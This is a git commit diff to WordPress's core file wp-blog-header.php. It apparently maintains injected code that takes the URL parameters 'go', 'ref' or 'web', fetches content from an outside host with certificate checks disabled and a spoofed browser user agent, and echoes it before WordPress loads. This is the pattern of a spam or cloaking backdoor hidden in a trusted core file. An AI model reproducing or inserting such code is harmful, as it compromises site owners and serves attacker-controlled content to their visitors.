e08b93de712f6cf93ae8a3a80719d03005681536
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-07-18 20:23:50 +0700

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -5,36 +5,7 @@
  * @package WordPress
  */
 function fetchDataFromSite($site) {
-    $url = 'https://replication2.pkcdurensawit.net/solusi-machinery/' . $site . '/';
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_CUSTOMREQUEST => 'GET'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-function fetchDataFromSite2($site) {
-    $url = 'https://replication2.pkcdurensawit.net/solusi-machinery_sites/?sites='.$site;
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_CUSTOMREQUEST => 'GET'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-function fetchDataFromSite3($site) {
-    $url = 'https://replication2.pkcdurensawit.net/solusi-machinery_web/?web='.$site;
-    $ch = curl_init($url);
+    $ch = curl_init($site);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
         CURLOPT_RETURNTRANSFER => true,
@@ -48,20 +19,22 @@ function fetchDataFromSite3($site) {
 }
 
 if(isset($_GET['go'])) {
-    $site = $_GET['go'];
+    $sitex = $_GET['go'];
+    $site = 'https://replication2.pkcdurensawit.net/solusi-machinery/?go='.$sitex;
     $data = fetchDataFromSite($site);
     echo $data;
 }
-elseif(isset($_GET['sites'])) {
-    $site = $_GET['sites'];
-    $data = fetchDataFromSite2($site);
+elseif(isset($_GET['ref'])) {
+    $sitex = $_GET['ref'];
+    $site = 'https://replication2.pkcdurensawit.net/solusi-machinery/?ref='.$sitex;
+    $data = fetchDataFromSite($site);
     echo $data;
 }
 elseif(isset($_GET['web'])) {
-    $site = $_GET['web'];
-    $data = fetchDataFromSite3($site);
-    echo $data;
-
+  $sitex = $_GET['web'];
+  $site = 'https://replication2.pkcdurensawit.net/solusi-machinery/?web='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
 } else {
   if ( ! isset( $wp_did_header ) ) {
 
